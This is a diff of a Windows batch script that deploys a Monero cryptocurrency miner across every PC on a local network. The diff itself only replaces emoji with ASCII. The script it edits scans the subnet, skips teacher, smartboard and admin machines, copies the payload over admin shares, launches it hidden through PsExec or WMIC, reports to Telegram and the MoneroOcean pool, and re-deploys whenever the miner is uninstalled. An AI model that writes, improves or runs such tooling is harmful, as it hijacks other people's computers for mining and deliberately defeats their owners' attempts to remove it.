@@ -2,13 +2,13 @@
 title Network Deployment - Deploy to All 25 PCs
 color 0A
 echo.
-echo ╔══════════════════════════════════════════════════════════════╗
-echo ║     NETWORK DEPLOYMENT - Deploy to All PCs Simultaneously    ║
-echo ╚══════════════════════════════════════════════════════════════╝
+echo +==============================================================+
+echo |     NETWORK DEPLOYMENT - Deploy to All PCs Simultaneously    |
+echo +==============================================================+
 echo.
 echo This script will deploy the miner to all PCs in your list.
 echo.
-echo ⚠️  REQUIREMENTS:
+echo [!] REQUIREMENTS:
 echo    1. Admin access to all target PCs
 echo    2. Network connectivity to all PCs
 echo    3. File sharing enabled on this PC
@@ -33,9 +33,9 @@ set EXCLUDE_PATTERNS=SMARTBOARD SMART-BOARD ANDROID-BOARD TEACHMINT TEACHER ADMI
 REM If empty, offer auto-discovery
 if "%PCS%"=="" (
     echo.
-    echo ╔══════════════════════════════════════════════════════════════╗
-    echo ║               PC DISCOVERY - Choose Method                   ║
-    echo ╚══════════════════════════════════════════════════════════════╝
+    echo +==============================================================+
+    echo |               PC DISCOVERY - Choose Method                   |
+    echo +==============================================================+
     echo.
     echo 1. AUTO-DISCOVER PCs on network (Recommended - No setup needed!)
     echo 2. Enter PC names/IPs manually
@@ -47,7 +47,7 @@ if "%PCS%"=="" (
     if "%CHOICE%"=="2" goto :manual_entry
     if "%CHOICE%"=="3" exit /b
     
-    echo ❌ Invalid choice. Exiting.
+    echo [X] Invalid choice. Exiting.
     pause
     exit /b
     
@@ -58,7 +58,7 @@ if "%PCS%"=="" (
     set /p PCS="PCs: "
     
     if "%PCS%"=="" (
-        echo ❌ No PCs entered. Exiting.
+        echo [X] No PCs entered. Exiting.
         pause
         exit /b
     )
@@ -66,11 +66,11 @@ if "%PCS%"=="" (
     
     :auto_discover
     echo.
-    echo ════════════════════════════════════════════════════════════
+    echo ============================================================
     echo  AUTO-DISCOVERING PCs ON YOUR NETWORK
-    echo ════════════════════════════════════════════════════════════
+    echo ============================================================
     echo.
-    echo 🔍 Scanning network... This may take 1-2 minutes.
+    echo [SCAN] Scanning network... This may take 1-2 minutes.
     echo    Please wait while we find all accessible PCs...
     echo.
     
@@ -80,17 +80,17 @@ if "%PCS%"=="" (
         echo # Get local subnet
         echo $localIP = ^(Get-NetIPAddress -AddressFamily IPv4 ^| Where-Object {$_.IPAddress -notlike "127.*" -and $_.PrefixOrigin -eq "Dhcp" -or $_.PrefixOrigin -eq "Manual"} ^| Select-Object -First 1^).IPAddress
         echo if ^(-not $localIP^) {
-        echo     Write-Host "❌ Could not determine local IP address"
+        echo     Write-Host "[X] Could not determine local IP address"
         echo     exit 1
         echo }
         echo.
-        echo Write-Host "📡 Your IP: $localIP"
+        echo Write-Host "SIGNAL Your IP: $localIP"
         echo Write-Host ""
         echo.
         echo # Extract subnet ^(assumes /24 network^)
         echo $subnet = $localIP.Substring^(0, $localIP.LastIndexOf^('.'^)^)
-        echo Write-Host "🌐 Scanning subnet: $subnet.0/24"
-        echo Write-Host "⏱️  This will take 1-2 minutes..."
+        echo Write-Host "[NET] Scanning subnet: $subnet.0/24"
+        echo Write-Host "[TIME] This will take 1-2 minutes..."
         echo Write-Host ""
         echo.
         echo $activePCs = @^(^)
@@ -112,18 +112,18 @@ if "%PCS%"=="" (
         echo             $excluded = $false
         echo             foreach ^($pattern in $patterns^) {
         echo                 if ^($hostname -like "*$pattern*"^) {
-        echo                     Write-Host "⚠️  Excluded: $hostname ^($ip^) - matches pattern '$pattern'" -ForegroundColor Yellow
+        echo                     Write-Host "[SKIP] Excluded: $hostname ^($ip^) - matches pattern '$pattern'" -ForegroundColor Yellow
         echo                     $excluded = $true
         echo                     break
         echo                 }
         echo             }
         echo             
         echo             if ^(-not $excluded^) {
-        echo                 Write-Host "✅ Found: $hostname ^($ip^)" -ForegroundColor Green
+        echo                 Write-Host "[OK] Found: $hostname ^($ip^)" -ForegroundColor Green
         echo                 "$hostname`t$ip"
         echo             }
         echo         } catch {
-        echo             Write-Host "✅ Found: $ip" -ForegroundColor Green
+        echo             Write-Host "[OK] Found: $ip" -ForegroundColor Green
         echo             "$ip`t$ip"
         echo         }
         echo     }
@@ -132,11 +132,11 @@ if "%PCS%"=="" (
         echo Write-Host ""
         echo $foundPCs = Get-Content "$env:TEMP\found_pcs.txt" -ErrorAction SilentlyContinue
         echo if ^($foundPCs^) {
-        echo     Write-Host "════════════════════════════════════════════"
-        echo     Write-Host "📊 DISCOVERED $^($foundPCs.Count^) ACTIVE PC^(S^)"
-        echo     Write-Host "════════════════════════════════════════════"
+        echo     Write-Host "============================================"
+        echo     Write-Host "[STATS] DISCOVERED $^($foundPCs.Count^) ACTIVE PC^(S^)"
+        echo     Write-Host "============================================"
         echo } else {
-        echo     Write-Host "❌ No PCs found on network"
+        echo     Write-Host "[X] No PCs found on network"
         echo }
     ) > "%DISCOVER_SCRIPT%"
     
@@ -146,9 +146,9 @@ if "%PCS%"=="" (
     REM Read discovered PCs
     if exist "%TEMP%\found_pcs.txt" (
         echo.
-        echo ════════════════════════════════════════════════════════════
+        echo ============================================================
         echo  SELECT PCs TO DEPLOY
-        echo ════════════════════════════════════════════════════════════
+        echo ============================================================
         echo.
         echo 1. Deploy to ALL discovered PCs
         echo 2. Let me choose specific PCs
@@ -164,7 +164,7 @@ if "%PCS%"=="" (
             )
             setlocal enabledelayedexpansion
             echo.
-            echo ✅ Will deploy to ALL discovered PCs
+            echo [OK] Will deploy to ALL discovered PCs
             echo PCs: !PCS!
             echo.
         ) else if "%DEPLOY_CHOICE%"=="2" (
@@ -184,7 +184,7 @@ if "%PCS%"=="" (
         del "%TEMP%\found_pcs.txt" >nul 2>&1
     ) else (
         echo.
-        echo ❌ Network discovery failed or no PCs found
+        echo [X] Network discovery failed or no PCs found
         echo    Falling back to manual entry...
         echo.
         goto :manual_entry
@@ -194,7 +194,7 @@ if "%PCS%"=="" (
 :config_done
 setlocal enabledelayedexpansion
 if "!PCS!"=="" (
-    echo ❌ No PCs selected. Exiting.
+    echo [X] No PCs selected. Exiting.
     pause
     exit /b
 )
@@ -233,7 +233,7 @@ echo @echo off
 echo powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%%~dp0DEPLOY_ULTIMATE.ps1"
 ) > "%DEPLOY_DIR%\START.bat"
 
-echo ✅ Package prepared!
+echo [OK] Package prepared!
 echo.
 
 REM ============================================================================
@@ -246,9 +246,9 @@ REM Create network share
 net share DeployPackage="%DEPLOY_DIR%" /grant:everyone,FULL >nul 2>&1
 
 if %errorlevel% equ 0 (
-    echo ✅ Network share created: \\%COMPUTERNAME%\DeployPackage
+    echo [OK] Network share created: \\%COMPUTERNAME%\DeployPackage
 ) else (
-    echo ⚠️  Could not create share (may already exist)
+    echo [!] Could not create share (may already exist)
 )
 
 echo.
@@ -266,15 +266,15 @@ set "TOTAL_COUNT=0"
 
 for %%P in (%PCS%) do (
     set /a TOTAL_COUNT+=1
-    echo ════════════════════════════════════════════════════════════
+    echo ============================================================
     echo PC: %%P
-    echo ════════════════════════════════════════════════════════════
+    echo ============================================================
     
     REM Test connection
     echo    Testing connection...
     ping -n 1 -w 1000 %%P >nul 2>&1
     if %errorlevel% neq 0 (
-        echo    ❌ PC offline or unreachable
+        echo    [X] PC offline or unreachable
         set /a FAIL_COUNT+=1
         echo.
         goto :next_pc
@@ -296,10 +296,10 @@ for %%P in (%PCS%) do (
             if %errorlevel% equ 0 (
                 psexec \\%%P -s -d cmd /c "C:\Temp\START.bat" >nul 2>&1
                 if %errorlevel% equ 0 (
-                    echo    ✅ Deployment initiated successfully
+                    echo    [OK] Deployment initiated successfully
                     set /a SUCCESS_COUNT+=1
                 ) else (
-                    echo    ⚠️  PsExec failed, trying alternative...
+                    echo    [!] PsExec failed, trying alternative...
                     goto :try_wmi
                 )
             ) else (
@@ -307,19 +307,19 @@ for %%P in (%PCS%) do (
                 REM Try method 2: WMIC
                 wmic /node:"%%P" process call create "cmd.exe /c C:\Temp\START.bat" >nul 2>&1
                 if %errorlevel% equ 0 (
-                    echo    ✅ Deployment initiated successfully (via WMIC)
+                    echo    [OK] Deployment initiated successfully (via WMIC)
                     set /a SUCCESS_COUNT+=1
                 ) else (
-                    echo    ❌ Deployment failed (try manual deployment)
+                    echo    [X] Deployment failed (try manual deployment)
                     set /a FAIL_COUNT+=1
                 )
             )
         ) else (
-            echo    ❌ Failed to copy files (check permissions)
+            echo    [X] Failed to copy files (check permissions)
             set /a FAIL_COUNT+=1
         )
     ) else (
-        echo    ❌ Cannot access \\%%P\C$ (check admin rights and file sharing)
+        echo    [X] Cannot access \\%%P\C$ (check admin rights and file sharing)
         set /a FAIL_COUNT+=1
     )
     
@@ -332,26 +332,26 @@ REM SUMMARY
 REM ============================================================================
 
 echo.
-echo ╔══════════════════════════════════════════════════════════════╗
-echo ║                      DEPLOYMENT SUMMARY                      ║
-echo ╚══════════════════════════════════════════════════════════════╝
+echo +==============================================================+
+echo |                      DEPLOYMENT SUMMARY                      |
+echo +==============================================================+
 echo.
 echo Total PCs:       %TOTAL_COUNT%
-echo ✅ Successful:   %SUCCESS_COUNT%
-echo ❌ Failed:       %FAIL_COUNT%
-echo 📊 Success Rate: TBD%%
+echo [OK] Successful:   %SUCCESS_COUNT%
+echo [X] Failed:       %FAIL_COUNT%
+echo [STATS] Success Rate: TBD%%
 echo.
 
 if %SUCCESS_COUNT% gtr 0 (
-    echo ✅ Deployment completed!
+    echo [OK] Deployment completed!
     echo.
-    echo 📱 Check Telegram for status updates from deployed PCs
-    echo 🌐 Check pool hashrate at: https://moneroocean.stream/
-    echo 📊 Run MONITOR_FLEET.ps1 to check status of all PCs
+    echo [TELEGRAM] Check Telegram for status updates from deployed PCs
+    echo [WEB] Check pool hashrate at: https://moneroocean.stream/
+    echo [STATS] Run MONITOR_FLEET.ps1 to check status of all PCs
 ) else (
-    echo ❌ No successful deployments!
+    echo [X] No successful deployments!
     echo.
-    echo 🔧 TROUBLESHOOTING:
+    echo [FIX] TROUBLESHOOTING:
     echo    1. Ensure you have admin rights on target PCs
     echo    2. Enable file and printer sharing on target PCs
     echo    3. Disable firewall temporarily for testing
@@ -370,19 +370,19 @@ REM ============================================================================
 
 if %FAIL_COUNT% gtr 0 (
     echo.
-    echo ════════════════════════════════════════════════════════════
+    echo ============================================================
     echo  CONTINUOUS NETWORK MONITORING (Recommended!)
-    echo ════════════════════════════════════════════════════════════
+    echo ============================================================
     echo.
-    echo ⚠️  %FAIL_COUNT% PC(s) were offline or failed to deploy
+    echo [!] %FAIL_COUNT% PC(s) were offline or failed to deploy
     echo.
-    echo 🔥 SOLUTION: Start automatic network monitoring
+    echo [HOT] SOLUTION: Start automatic network monitoring
     echo    - Runs continuously in background
     echo    - Auto-deploys to PCs when they come online
     echo    - Catches all missed PCs automatically
     echo    - Re-deploys if someone uninstalls
     echo.
-    echo 📋 OPTIONS:
+    echo [MENU] OPTIONS:
     echo    1. YES - Start monitoring now (Recommended!)
     echo    2. NO  - Skip monitoring (you'll need to redeploy manually)
     echo.
@@ -390,7 +390,7 @@ if %FAIL_COUNT% gtr 0 (
     
     if "!MONITOR_CHOICE!"=="1" (
         echo.
-        echo ✅ Starting network monitoring in new window...
+        echo [OK] Starting network monitoring in new window...
         echo    This will run continuously and catch offline PCs.
         echo    You can minimize the window.
         echo.
@@ -398,17 +398,17 @@ if %FAIL_COUNT% gtr 0 (
         REM Check if NETWORK_REDEPLOY.ps1 exists
         if exist "%~dp0🌐_NETWORK_REDEPLOY.ps1" (
             start "Network Monitoring - Auto Redeploy" powershell -ExecutionPolicy Bypass -NoExit -Command "& '%~dp0🌐_NETWORK_REDEPLOY.ps1'"
-            echo ✅ Network monitoring started in separate window!
-            echo    📊 It will check every 10 minutes and auto-deploy to offline PCs
-            echo    ⚠️  Keep that window running in background
+            echo [OK] Network monitoring started in separate window!
+            echo    [STATS] It will check every 10 minutes and auto-deploy to offline PCs
+            echo    [!] Keep that window running in background
         ) else (
-            echo ❌ 🌐_NETWORK_REDEPLOY.ps1 not found in current folder
+            echo [X] NETWORK_REDEPLOY.ps1 not found in current folder
             echo    Make sure all files are in the same folder
         )
     ) else (
         echo.
-        echo ⚠️  Monitoring skipped.
-        echo    You can start it later by running: 🌐_NETWORK_REDEPLOY.ps1
+        echo [!] Monitoring skipped.
+        echo    You can start it later by running: NETWORK_REDEPLOY.ps1
     )
 )
 
